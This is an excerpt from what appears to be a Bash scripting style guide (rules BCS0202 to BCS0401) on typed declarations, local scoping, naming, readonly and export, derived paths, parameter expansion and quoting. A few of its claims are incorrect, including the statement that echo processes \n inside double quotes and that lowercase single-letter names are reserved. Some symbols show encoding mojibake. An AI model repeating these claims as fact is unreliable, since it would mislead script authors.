**6. Local variables in functions (`local`)**

Variables scoped to function, not visible outside.

```bash
process_file() {
  local -- filename="$1"
  local -i line_count
  local -a lines

  line_count=$(wc -l < "$filename")
  readarray -t lines < "$filename"
  echo "Processed $line_count lines"
}
```

**Use for**: ALL function parameters, ALL temporary variables in functions

**Combining type and scope:**

```bash
declare -i GLOBAL_COUNT=0

function count_files() {
  local -- dir="$1"
  local -i file_count=0
  local -a files

  files=("$dir"/*)
  for file in "${files[@]}"; do
    [[ -f "$file" ]] && ((file_count+=1))
  done
  echo "$file_count"
}

declare -a PROCESSED_FILES=()
declare -A FILE_STATUS=()
readonly -- CONFIG_FILE='config.conf'
```

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -i VERBOSE=0
declare -i ERROR_COUNT=0
declare -i MAX_RETRIES=3

declare -- LOG_FILE="/var/log/$SCRIPT_NAME.log"
declare -- CONFIG_FILE="$SCRIPT_DIR/config.conf"

declare -a FILES_TO_PROCESS=()
declare -a FAILED_FILES=()

declare -A CONFIG=(
  [timeout]='30'
  [retries]='3'
)

declare -A FILE_CHECKSUMS=()

if [[ -t 1 && -t 2 ]]; then
  readonly -- RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  readonly -- RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    info)    prefix+=" ${CYAN}â—‰${NC}" ;;
    warn)    prefix+=" ${YELLOW}â–²${NC}" ;;
    success) prefix+=" ${GREEN}âœ“${NC}" ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

process_file() {
  local -- input_file="$1"
  local -i attempt=0 success=0
  local -- checksum

  while ((attempt < MAX_RETRIES && !success)); do
    ((attempt+=1))
    info "Processing $input_file (attempt $attempt)"

    if process_command "$input_file"; then
      success=1
      checksum=$(sha256sum "$input_file" | cut -d' ' -f1)
      FILE_CHECKSUMS["$input_file"]="$checksum"
      info "Success: $input_file ($checksum)"
    else
      warn "Failed: $input_file (attempt $attempt/$MAX_RETRIES)"
      ((ERROR_COUNT+=1))
    fi
  done

  if ((success)); then
    return 0
  else
    FAILED_FILES+=("$input_file")
    return 1
  fi
}

main() {
  FILES_TO_PROCESS=("$SCRIPT_DIR"/data/*.txt)

  local -- file
  for file in "${FILES_TO_PROCESS[@]}"; do
    process_file "$file"
  done

  info "Processed: ${#FILES_TO_PROCESS[@]} files"
  info "Errors: $ERROR_COUNT"
  info "Failed: ${#FAILED_FILES[@]} files"

  local -- filename
  for filename in "${!FILE_CHECKSUMS[@]}"; do
    info "Checksum: $filename = ${FILE_CHECKSUMS[$filename]}"
  done

  ((ERROR_COUNT == 0))
}

main "$@"

#fin
```

**Anti-patterns:**

```bash
# âœ— Wrong - no type declaration
count=0
files=()

# âœ“ Correct
declare -i count=0
declare -a files=()

# âœ— Wrong - strings for numeric operations
max_retries='3'
if [[ "$attempts" -lt "$max_retries" ]]; then  # String comparison!

# âœ“ Correct
declare -i max_retries=3
if ((attempts < max_retries)); then  # Numeric comparison

# âœ— Wrong - forgetting -A for associative arrays
declare CONFIG  # Creates scalar
CONFIG[key]='value'  # Treats 'key' as 0, creates indexed array!

# âœ“ Correct
declare -A CONFIG=()
CONFIG[key]='value'

# âœ— Wrong - global variables in functions
process_data() {
  temp_var="$1"  # Global leak!
}

# âœ“ Correct
process_data() {
  local -- temp_var="$1"
}

# âœ— Wrong - forgetting -- separator
declare filename='-weird'  # Interpreted as option!

# âœ“ Correct
declare -- filename='-weird'

# âœ— Wrong - scalar assignment to array
declare -a files=()
files='file.txt'  # Overwrites array!

# âœ“ Correct
declare -a files=()
files=('file.txt')  # Array element
# Or
files+=('file.txt')  # Append
```

**Edge cases:**

**1. Integer overflow:**

```bash
declare -i big_number=9223372036854775807  # Max 64-bit signed int
((big_number+=1))
echo "$big_number"  # Wraps to negative!

# For very large numbers, use string or bc
declare -- big='99999999999999999999'
result=$(bc <<< "$big + 1")
```

**2. Array assignment syntax:**

```bash
declare -a arr1=()           # Empty array
declare -a arr2=('a' 'b')    # Array with 2 elements
declare -a arr3              # Declare without initialization

# This creates scalar, not array:
declare -a arr4='string'     # arr4 is string, not array!

# Correct single element:
declare -a arr5=('string')   # Array with one element
```

**Summary:**

- **`declare -i`** for integers (counters, exit codes, ports)
- **`declare --`** for strings (paths, text, user input)
- **`declare -a`** for indexed arrays (lists, sequences)
- **`declare -A`** for associative arrays (key-value maps, configs)
- **`readonly --`** for constants
- **`local`** for ALL variables in functions
- **Combine modifiers**: `local -i`, `local -a`, `readonly -A`
- **Always use `--`** separator to prevent option injection

**Key principle:** Explicit type declarations serve as inline documentation and enable type checking. `declare -i count=0` tells both Bash and readers: "This variable holds an integer for arithmetic operations."


---


**Rule: BCS0202**

## Variable Scoping
Always declare function-specific variables as `local` to prevent namespace pollution and unexpected side effects.

```bash
# Global variables - declare at top
declare -i VERBOSE=1 PROMPT=1

# Function variables - always use local
main() {
  local -a add_specs=()      # Local array
  local -i max_depth=3       # Local integer
  local -- path dir          # Local strings
  dir=$(dirname -- "$name")
}
```

**Rationale:** Without `local`, function variables become global, causing: (1) overwriting global variables with same name, (2) persistence after function returns, (3) interference with recursive calls.

**Anti-patterns:**
```bash
#  Wrong - no local declaration
process_file() {
  file="$1"  # Overwrites any global $file!
}

#  Correct - local declaration
process_file() {
  local -- file="$1"  # Scoped to function only
}

#  Wrong - recursive functions without local
count_files() {
  total=0  # Global! Each recursive call resets it
  for file in "$1"/*; do ((total++)); done
  echo "$total"
}

#  Correct
count_files() {
  local -i total=0  # Each invocation gets own total
  for file in "$1"/*; do ((total++)); done
  echo "$total"
}
```


---


**Rule: BCS0203**

## Naming Conventions

Follow these naming conventions to maintain consistency and avoid conflicts with shell built-ins.

| Type | Convention | Example |
|------|------------|---------|
| Constants | UPPER_CASE | `readonly MAX_RETRIES=3` |
| Global variables | UPPER_CASE or CamelCase | `VERBOSE=1` or `ConfigFile='/etc/app.conf'` |
| Local variables | lower_case with underscores | `local file_count=0` |
|  | CamelCase acceptable for important locals | `local ConfigData` |
| Internal/private functions | prefix with _ | `_validate_input()` |
| Environment variables | UPPER_CASE with underscores | `export DATABASE_URL` |

**Examples:**
```bash
# Constants
readonly -- SCRIPT_VERSION='1.0.0'
readonly -- MAX_CONNECTIONS=100

# Global variables
declare -i VERBOSE=1
declare -- ConfigFile='/etc/myapp.conf'

# Local variables
process_data() {
  local -i line_count=0
  local -- temp_file
  local -- CurrentSection  # CamelCase for important variable
}

# Private functions
_internal_helper() {
  # Used only by other functions in this script
}
```

**Rationale:**
- **UPPER_CASE for globals/constants**: Immediately visible as script-wide scope, matches shell conventions
- **lower_case for locals**: Distinguishes from globals, prevents accidental shadowing
- **Underscore prefix for private functions**: Signals "internal use only", prevents namespace conflicts
- **Avoid lowercase single-letter names**: Reserved for shell (`a`, `b`, `n`, etc.)
- **Avoid all-caps shell variables**: Don't use `PATH`, `HOME`, `USER`, etc. as your variable names


---


**Rule: BCS0204**

## Constants and Environment Variables

**Constants (readonly):**
```bash
# Use readonly for values that never change
readonly -- SCRIPT_VERSION='1.0.0'
readonly -- MAX_RETRIES=3
readonly -- CONFIG_DIR='/etc/myapp'

# Group readonly declarations
VERSION='1.0.0'
AUTHOR='John Doe'
LICENSE='MIT'
readonly -- VERSION AUTHOR LICENSE
```

**Environment variables (export):**
```bash
# Use declare -x (or export) for variables passed to child processes
declare -x ORACLE_SID='PROD'
declare -x DATABASE_URL='postgresql://localhost/mydb'

# Alternative syntax
export LOG_LEVEL='DEBUG'
export TEMP_DIR='/tmp/myapp'
```

**Rationale:**

**Use `readonly` for:**
- Script metadata (VERSION, AUTHOR, LICENSE)
- Configuration paths determined at startup
- Derived constants from calculations
- Purpose: Prevent accidental modification

**Use `declare -x` / `export` for:**
- Values needed by child processes
- Environment configuration for external tools
- Settings inherited by subshells
- Purpose: Make variable available in subprocess environment

**Key differences:**

| Feature | `readonly` | `declare -x` / `export` |
|---------|-----------|------------------------|
| Prevents modification | âœ“ Yes | âœ— No |
| Available in subprocesses | âœ— No | âœ“ Yes |
| Can be changed later | âœ— Never | âœ“ Yes |
| Use case | Constants | Environment config |

**Combining both (readonly + export):**
```bash
# Make a constant that is also exported to child processes
declare -rx BUILD_ENV='production'
readonly -x MAX_CONNECTIONS=100

# Or in two steps
declare -x DATABASE_URL='postgresql://prod-db/app'
readonly -- DATABASE_URL
```

**Anti-patterns:**

```bash
# âœ— Wrong - exporting constants unnecessarily
export MAX_RETRIES=3  # Child processes don't need this

# âœ“ Correct - only make it readonly
readonly -- MAX_RETRIES=3

# âœ— Wrong - not making true constants readonly
CONFIG_FILE='/etc/app.conf'  # Could be accidentally modified

# âœ“ Correct - protect against modification
readonly -- CONFIG_FILE='/etc/app.conf'

# âœ— Wrong - making user-configurable variables readonly too early
readonly -- OUTPUT_DIR="$HOME/output"  # Can't be overridden!

# âœ“ Correct - allow override, then make readonly
OUTPUT_DIR="${OUTPUT_DIR:-$HOME/output}"
readonly -- OUTPUT_DIR
```

**Complete example:**
```bash
#!/usr/bin/env bash
set -euo pipefail

# Script constants (not exported)
readonly -- SCRIPT_VERSION='2.1.0'
readonly -- MAX_FILE_SIZE=$((100 * 1024 * 1024))  # 100MB

# Environment variables for child processes (exported)
declare -x LOG_LEVEL="${LOG_LEVEL:-INFO}"
declare -x TEMP_DIR="${TMPDIR:-/tmp}"

# Combined: readonly + exported
declare -rx BUILD_ENV='production'

# Derived constants (readonly)
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
readonly -- SCRIPT_PATH SCRIPT_DIR
```


---


**Rule: BCS0205**

## Readonly After Group

**When declaring multiple readonly variables, declare them first with values, then make them readonly in a single statement. This improves readability, prevents assignment errors, and makes immutability explicit.**

**Rationale:**

- **Prevents Assignment Errors**: Cannot assign to already-readonly variable
- **Visual Grouping**: Related constants grouped as logical unit
- **Clear Intent**: Single readonly statement makes immutability obvious
- **Maintainability**: Easy to add/remove variables from group
- **Separates Phases**: Initialization (values) separate from protection (readonly)
- **Error Detection**: Script fails if uninitialized variable in readonly statement

**Standard pattern:**

```bash
# Script metadata
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Color definitions
if [[ -t 1 && -t 2 ]]; then
  readonly -- RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  readonly -- RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```

**Logical groups:**

**1. Script metadata:**
```bash
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME
```

**2. Color definitions:**
```bash
if [[ -t 1 && -t 2 ]]; then
  RED=$'\033[0;31m'
  GREEN=$'\033[0;32m'
  YELLOW=$'\033[0;33m'
  CYAN=$'\033[0;36m'
  NC=$'\033[0m'
else
  RED=''
  GREEN=''
  YELLOW=''
  CYAN=''
  NC=''
fi
readonly -- RED GREEN YELLOW CYAN NC
```

**3. Path constants:**
```bash
PREFIX="${PREFIX:-/usr/local}"
BIN_DIR="$PREFIX/bin"
SHARE_DIR="$PREFIX/share/myapp"
LIB_DIR="$PREFIX/lib/myapp"
readonly -- PREFIX BIN_DIR SHARE_DIR LIB_DIR
```

**Anti-patterns:**

```bash
#  Wrong - individual readonly declarations
readonly VERSION='1.0.0'
readonly SCRIPT_PATH=$(realpath -- "$0")
readonly SCRIPT_DIR=${SCRIPT_PATH%/*}
# Problems: visually cluttered, harder to track initialization errors

#  Correct - initialize all, then group readonly
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR

#  Wrong - premature readonly
VERSION='1.0.0'
readonly -- VERSION  # Too early!
SCRIPT_PATH=$(realpath -- "$0")
# Creates inconsistent protection if SCRIPT_PATH fails

#  Wrong - missing -- separator
readonly VERSION SCRIPT_PATH  # Risky if name starts with -

#  Correct - always use --
readonly -- VERSION SCRIPT_PATH

#  Wrong - unrelated variables grouped
CONFIG_FILE='config.conf'
VERBOSE=1
SCRIPT_PATH=$(realpath -- "$0")
readonly -- CONFIG_FILE VERBOSE SCRIPT_PATH  # No logical relationship

#  Correct - group logically related
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
readonly -- SCRIPT_PATH SCRIPT_DIR
```

**Edge case: Derived variables**

Initialize in dependency order:

```bash
PREFIX="${PREFIX:-/usr/local}"
BIN_DIR="$PREFIX/bin"      # Depends on PREFIX
SHARE_DIR="$PREFIX/share"  # Depends on PREFIX
readonly -- PREFIX BIN_DIR SHARE_DIR
```

**Edge case: Delayed readonly after argument parsing**

```bash
#!/bin/bash
set -euo pipefail

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
readonly -- VERSION SCRIPT_PATH

# Mutable until parsing complete
declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -- CONFIG_FILE=''

main() {
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    -c|--config)  noarg "$@"; shift; CONFIG_FILE="$1" ;;
  esac; shift; done

  # Now make parsed values readonly
  readonly -- VERBOSE DRY_RUN
  [[ -n "$CONFIG_FILE" ]] && readonly -- CONFIG_FILE

  ((VERBOSE)) && info 'Verbose mode enabled'
}

main "$@"
#fin
```

**Edge case: Arrays**

```bash
declare -a REQUIRED_COMMANDS=('git' 'make' 'tar')
declare -a OPTIONAL_COMMANDS=('md2ansi' 'pandoc')
readonly -a REQUIRED_COMMANDS OPTIONAL_COMMANDS
# Or: readonly -- REQUIRED_COMMANDS OPTIONAL_COMMANDS
```

**When NOT to use readonly:**

```bash
# Don't make readonly if value changes during execution
declare -i count=0  # Modified in loops

# Don't make readonly during conditional logic
config_file=''
if [[ -f 'custom.conf' ]]; then
  config_file='custom.conf'
fi
# Only readonly when value is final
[[ -n "$config_file" ]] && readonly -- config_file
```

**Summary:**

- Initialize first, readonly second
- Group logically related variables
- Always use `--` separator
- Make readonly as soon as values are final
- Delay readonly for argument-parsed variables


---


**Rule: BCS0206**

## Readonly Declaration
Use `readonly` for constants to prevent accidental modification.

```bash
readonly -a REQUIRED=(pandoc git md2ansi)
#shellcheck disable=SC2155 # acceptable; if realpath fails then we have much bigger problems
readonly -- SCRIPT_PATH="$(realpath -- "$0")"
```


---


**Rule: BCS0207**

## Boolean Flags Pattern

Use integer variables with `declare -i` for boolean state tracking:

```bash
# Boolean flags - integers with explicit initialization
declare -i INSTALL_BUILTIN=0
declare -i DRY_RUN=0
declare -i VERBOSE=0

# Test in conditionals using (())
((DRY_RUN)) && info 'Dry-run mode enabled'

if ((INSTALL_BUILTIN)); then
  install_loadable_builtins
fi

# Toggle
((VERBOSE)) && VERBOSE=0 || VERBOSE=1

# Set from command-line
case $1 in
  --dry-run) DRY_RUN=1 ;;
esac
```

**Guidelines:**
- Use `declare -i` for integer boolean flags
- ALL_CAPS descriptive names (`DRY_RUN`, `INSTALL_BUILTIN`)
- Initialize explicitly: `0` (false) or `1` (true)
- Test with `((FLAG))` - true for non-zero, false for zero
- Separate boolean flags from integer counters


---


**Rule: BCS0209**

## Derived Variables

**Derived variables are computed from other variables. Group them with section comments explaining dependencies. Document hardcoded exceptions. Update all derived variables when base values change during execution (especially in argument parsing).**

**Rationale:**

- **DRY Principle**: Single source of truth for base values
- **Consistency**: When PREFIX changes, all paths update automatically
- **Maintainability**: One change location propagates to derivations
- **Explicit Dependencies**: Section comments show variable relationships
- **Correctness**: Updating derived variables when base changes prevents bugs

**Simple derived variables:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ============================================================================
# Configuration - Base Values
# ============================================================================

declare -- PREFIX='/usr/local'
declare -- APP_NAME='myapp'

# ============================================================================
# Configuration - Derived Paths
# ============================================================================

# All paths derived from PREFIX
declare -- BIN_DIR="$PREFIX/bin"
declare -- LIB_DIR="$PREFIX/lib"
declare -- SHARE_DIR="$PREFIX/share"
declare -- DOC_DIR="$PREFIX/share/doc/$APP_NAME"

# Application-specific derived paths
declare -- CONFIG_DIR="$HOME/.$APP_NAME"
declare -- CONFIG_FILE="$CONFIG_DIR/config.conf"
declare -- CACHE_DIR="$HOME/.cache/$APP_NAME"
declare -- DATA_DIR="$HOME/.local/share/$APP_NAME"

main() {
  echo "Installation prefix: $PREFIX"
  echo "Binaries: $BIN_DIR"
  echo "Libraries: $LIB_DIR"
  echo "Documentation: $DOC_DIR"
}

main "$@"

#fin
```

**XDG Base Directory with environment fallbacks:**

```bash
# XDG Base Directory Specification
declare -- CONFIG_BASE="${XDG_CONFIG_HOME:-$HOME/.config}"
declare -- CONFIG_DIR="$CONFIG_BASE/$APP_NAME"
declare -- CONFIG_FILE="$CONFIG_DIR/config.conf"

declare -- DATA_BASE="${XDG_DATA_HOME:-$HOME/.local/share}"
declare -- DATA_DIR="$DATA_BASE/$APP_NAME"

declare -- STATE_BASE="${XDG_STATE_HOME:-$HOME/.local/state}"
declare -- LOG_DIR="$STATE_BASE/$APP_NAME"
declare -- LOG_FILE="$LOG_DIR/app.log"

declare -- CACHE_BASE="${XDG_CACHE_HOME:-$HOME/.cache}"
declare -- CACHE_DIR="$CACHE_BASE/$APP_NAME"
```

**Updating derived variables when base changes:**

```bash
declare -- PREFIX='/usr/local'
declare -- APP_NAME='myapp'

declare -- BIN_DIR="$PREFIX/bin"
declare -- LIB_DIR="$PREFIX/lib"
declare -- DOC_DIR="$PREFIX/share/doc/$APP_NAME"

# Update all derived paths when PREFIX changes
update_derived_paths() {
  BIN_DIR="$PREFIX/bin"
  LIB_DIR="$PREFIX/lib"
  SHARE_DIR="$PREFIX/share"
  MAN_DIR="$PREFIX/share/man"
  DOC_DIR="$PREFIX/share/doc/$APP_NAME"
}

main() {
  while (($#)); do
    case $1 in
      --prefix)
        noarg "$@"
        shift
        PREFIX="$1"
        # CRITICAL: Update derived paths when PREFIX changes
        update_derived_paths
        ;;

      --app-name)
        noarg "$@"
        shift
        APP_NAME="$1"
        # DOC_DIR depends on APP_NAME
        DOC_DIR="$PREFIX/share/doc/$APP_NAME"
        ;;
    esac
    shift
  done

  # Make readonly after parsing
  readonly -- PREFIX APP_NAME BIN_DIR LIB_DIR SHARE_DIR DOC_DIR
}
```

**Complex derivations with multiple dependencies:**

```bash
# Base values
declare -- ENVIRONMENT='production'
declare -- REGION='us-east'
declare -- APP_NAME='myapp'
declare -- NAMESPACE='default'

# Composite identifiers
declare -- DEPLOYMENT_ID="$APP_NAME-$ENVIRONMENT-$REGION"
declare -- RESOURCE_PREFIX="$NAMESPACE-$APP_NAME"
declare -- LOG_PREFIX="$ENVIRONMENT/$REGION/$APP_NAME"

# Environment-dependent paths
declare -- CONFIG_DIR="/etc/$APP_NAME/$ENVIRONMENT"
declare -- CONFIG_FILE="$CONFIG_DIR/config-$REGION.conf"
declare -- PID_FILE="/var/run/$DEPLOYMENT_ID.pid"

# Derived URLs
declare -- API_HOST="api-$ENVIRONMENT.example.com"
declare -- API_URL="https://$API_HOST/v1"
declare -- METRICS_URL="https://metrics-$REGION.example.com/$APP_NAME"
```

**Anti-patterns:**

```bash
#  Wrong - duplicating values
PREFIX='/usr/local'
BIN_DIR='/usr/local/bin'        # Duplicates PREFIX!

#  Correct - derive from base
PREFIX='/usr/local'
BIN_DIR="$PREFIX/bin"

#  Wrong - not updating derived variables
case $1 in
  --prefix)
    PREFIX="$1"
    # BIN_DIR now wrong!
    ;;
esac

#  Correct - update derived
case $1 in
  --prefix)
    PREFIX="$1"
    BIN_DIR="$PREFIX/bin"     # Update
    ;;
esac

#  Wrong - no explanation
CONFIG_DIR="$HOME/.config/$APP_NAME"
DATA_DIR="$HOME/.local/share/$APP_NAME"

#  Correct - section comment
# Derived from $HOME and $APP_NAME
CONFIG_DIR="$HOME/.config/$APP_NAME"
DATA_DIR="$HOME/.local/share/$APP_NAME"

#  Wrong - readonly before base can change
BIN_DIR="$PREFIX/bin"
readonly -- BIN_DIR             # Can't update!

#  Correct - readonly after all parsing
PREFIX='/usr/local'
BIN_DIR="$PREFIX/bin"
# Parse arguments...
readonly -- PREFIX BIN_DIR

#  Wrong - inconsistent derivation
CONFIG_DIR='/etc/myapp'                  # Hardcoded
LOG_DIR="/var/log/$APP_NAME"             # Derived

#  Correct - consistent
CONFIG_DIR="/etc/$APP_NAME"              # Derived
LOG_DIR="/var/log/$APP_NAME"             # Derived
```

**Edge cases:**

**1. Conditional derivation:**

```bash
if [[ "$ENVIRONMENT" == 'development' ]]; then
  CONFIG_DIR="$SCRIPT_DIR/config"
  LOG_DIR="$SCRIPT_DIR/logs"
else
  CONFIG_DIR="/etc/$APP_NAME"
  LOG_DIR="/var/log/$APP_NAME"
fi

CONFIG_FILE="$CONFIG_DIR/config.conf"
LOG_FILE="$LOG_DIR/app.log"
```

**2. Platform-specific:**

```bash
case "$(uname -s)" in
  Darwin)
    LIB_EXT='dylib'
    CONFIG_DIR="$HOME/Library/Application Support/$APP_NAME"
    ;;
  Linux)
    LIB_EXT='so'
    CONFIG_DIR="$HOME/.config/$APP_NAME"
    ;;
esac

LIBRARY_NAME="lib$APP_NAME.$LIB_EXT"
CONFIG_FILE="$CONFIG_DIR/config.conf"
```

**3. Hardcoded exceptions (document why):**

```bash
PREFIX='/usr/local'
BIN_DIR="$PREFIX/bin"
LIB_DIR="$PREFIX/lib"

# Exception: System profile must be /etc (shell initialization requires fixed path)
PROFILE_DIR='/etc/profile.d'           # Hardcoded by design
PROFILE_FILE="$PROFILE_DIR/$APP_NAME.sh"
```

**4. Multiple update functions:**

```bash
update_prefix_paths() {
  BIN_DIR="$PREFIX/bin"
  LIB_DIR="$PREFIX/lib"
  SHARE_DIR="$PREFIX/share"
}

update_app_paths() {
  CONFIG_DIR="/etc/$APP_NAME"
  LOG_DIR="/var/log/$APP_NAME"
  DATA_DIR="/var/lib/$APP_NAME"
}

update_all_derived() {
  update_prefix_paths
  update_app_paths
  CONFIG_FILE="$CONFIG_DIR/config.conf"
  LOG_FILE="$LOG_DIR/app.log"
}
```

**Summary:**

- **Group derived variables** with section comments explaining dependencies
- **Derive from base values** - never duplicate
- **Update when base changes** - especially during argument parsing
- **Document exceptions** - explain hardcoded values
- **Consistent derivation** - if one derives from APP_NAME, all should
- **Environment fallbacks** - use `${XDG_VAR:-$HOME/default}` pattern
- **Make readonly last** - after all parsing and derivation
- **Update functions** - centralize logic when many variables

**Key principle:** Derived variables implement DRY at configuration level. Define information once (base value), derive everything else. Ensures consistency when base values change. Group with explanatory comments, update when base changes during execution.


---


**Rule: BCS0300**

# Variable Expansion & Parameter Substitution

Default form is `"$var"` without braces. Use braces (`"${var}"`) only when syntactically required: parameter expansion operations (`${var##pattern}`, `${var:-default}`), variable concatenation (`"${var1}${var2}"`), array expansions (`"${array[@]}"`), and disambiguation. This keeps code clean and readable.


---


**Rule: BCS0301**

## Parameter Expansion
```bash
SCRIPT_NAME=${SCRIPT_PATH##*/} # Remove longest prefix pattern
SCRIPT_DIR=${SCRIPT_PATH%/*}   # Remove shortest suffix pattern
${var:-default}                # Default value
${var:0:1}                     # Substring
${#array[@]}                   # Array length
${var,,}                       # Lowercase conversion
"${@:2}"                       # All args starting from 2nd
```


---


**Rule: BCS0302**

## Variable Expansion Guidelines

**General Rule:** Always quote variables with `"$var"` as default. Only use braces `"${var}"` when syntactically necessary.

**Rationale:** Braces add visual noise without value when not required. Using them only when necessary makes code cleaner and necessary cases stand out.

#### When Braces Are REQUIRED

1. **Parameter expansion operations:**
   ```bash
   "${var##*/}"      # Remove longest prefix pattern
   "${var%/*}"       # Remove shortest suffix pattern
   "${var:-default}" # Default value
   "${var:0:5}"      # Substring
   "${var//old/new}" # Pattern substitution
   "${var,,}"        # Case conversion
   ```

2. **Variable concatenation (no separator):**
   ```bash
   "${var1}${var2}${var3}"  # Multiple variables joined
   "${prefix}suffix"        # Variable immediately followed by alphanumeric
   ```

3. **Array access:**
   ```bash
   "${array[index]}"         # Array element access
   "${array[@]}"             # All array elements
   "${#array[@]}"            # Array length
   ```

4. **Special parameter expansion:**
   ```bash
   "${@:2}"                  # Positional parameters starting from 2nd
   "${10}"                   # Positional parameters beyond $9
   "${!var}"                 # Indirect expansion
   ```

#### When Braces Are NOT Required

**Standalone variables and path concatenation with separators:**
```bash
# âœ“ Correct
"$var"
"$PREFIX"/bin
"$PREFIX/bin"
"$SCRIPT_DIR"/build/lib/file.so
echo "Installing to $PREFIX/bin"
info "Found $count files"
[[ -d "$path" ]]
[[ -f "$SCRIPT_DIR"/file ]]

# âœ— Wrong - unnecessary braces
"${var}"
"${PREFIX}"/bin
"${PREFIX}/bin"
echo "Installing to ${PREFIX}/bin"
info "Found ${count} files"
```

**Note:** Pattern `"$var"/literal/"$var"` (mixing quoted variables with unquoted separators) is preferred. Quotes protect variables while separators (/, -, .) naturally delimit without requiring quotes.

#### Edge Cases

**When next character is alphanumeric AND no separator:**
```bash
# Braces required - prevents ambiguity
"${var}_suffix"             # âœ“ Prevents $var_suffix interpretation
"${prefix}123"              # âœ“ Prevents $prefix123 interpretation

# No braces needed - separator present
"$var-suffix"               # âœ“ Dash is separator
"$var.suffix"               # âœ“ Dot is separator
"$var/path"                 # âœ“ Slash is separator
```

#### Summary Table

| Situation | Form | Example |
|-----------|------|---------|
| Standalone variable | `"$var"` | `"$HOME"` |
| Path with separator | `"$var"/path` or `"$var/path"` | `"$BIN_DIR"/file` |
| Parameter expansion | `"${var%pattern}"` | `"${path%/*}"` |
| Concatenation (no separator) | `"${var1}${var2}"` | `"${prefix}${suffix}"` |
| Array access | `"${array[i]}"` | `"${args[@]}"` |
| In echo/info strings | `"$var"` | `echo "File: $path"` |
| Conditionals | `"$var"` | `[[ -f "$file" ]]` |

**Key Principle:** Use `"$var"` by default. Only add braces when shell requires them for correct parsing.


---


**Rule: BCS0400**

# Quoting & String Literals

This section establishes critical quoting rules that prevent word-splitting errors and clarify code intent. The fundamental principle: single quotes (`'...'`) for static literals, double quotes (`"..."`) when variable expansion, command substitution, or escape sequences are needed. This section covers 14 patterns: static strings, one-word literals (may be unquoted but quoting is defensive), strings with variables, mixed quoting, command substitution, variables in conditionals (always quote), array expansions, here documents, echo/printf statements, anti-patterns, string trimming, displaying variables, and pluralization helpers. Single quotes signal "literal text" while double quotes signal "shell processing needed"this semantic distinction aids comprehension.


---


**Rule: BCS0401**

## Static Strings and Constants

**Always use single quotes for string literals that contain no variables:**

```bash
# Message functions - single quotes for static strings
info 'Checking prerequisites...'
success 'Prerequisites check passed'
warn 'bash-builtins package not found'
error 'Failed to install package'

# Variable assignments
SCRIPT_DESC='Mail Tools Installation Script'
DEFAULT_PATH='/usr/local/bin'
MESSAGE='Operation completed successfully'

# Conditionals with static strings
[[ "$status" == 'success' ]]     #  Correct
[[ "$status" == "success" ]]     #  Unnecessary double quotes
```

**Rationale:**

1. **Performance**: Single quotes are faster (no parsing for variables/escapes)
2. **Clarity**: Signals "this is literal, no substitution"
3. **Safety**: Prevents accidental variable expansion or command substitution
4. **No escaping**: Special characters like `$`, `` ` ``, `\`, `!` don't need escaping

**When single quotes are required:**

```bash
# Strings with special characters
msg='The variable $PATH will not expand here'
cmd='This `command` will not execute'
note='Backslashes \ do not escape anything in single quotes'

# SQL queries and regex patterns
sql='SELECT * FROM users WHERE name = "John"'
regex='^\$[0-9]+\.[0-9]{2}$'  # Matches $12.34

# Shell commands stored as strings
find_cmd='find /tmp -name "*.log" -mtime +7 -delete'
```

**When double quotes are needed:**

```bash
# When variables must be expanded
info "Found $count files in $directory"
warn "File $filename does not exist"

# When command substitution is needed
msg="Current time: $(date +%H:%M:%S)"

# When escape sequences are needed
echo "Line 1\nLine 2"  # \n processed in double quotes
```

**Anti-patterns:**

```bash
#  Wrong - double quotes for static strings
info "Checking prerequisites..."  # No variables, use single quotes
[[ "$status" == "active" ]]       # Right side should be single-quoted

#  Correct
info 'Checking prerequisites...'
[[ "$status" == 'active' ]]

#  Wrong - unnecessary escaping in double quotes
msg="The cost is \$5.00"          # Must escape $

#  Correct - no escaping needed
msg='The cost is $5.00'

#  Wrong - variables in single quotes don't expand
name='John'
greeting='Hello, $name'  #  greeting = "Hello, $name"

#  Correct - use double quotes for variables
greeting="Hello, $name"  #  greeting = "Hello, John"
```

**Combining quotes:**

```bash
# Single quote inside double quotes
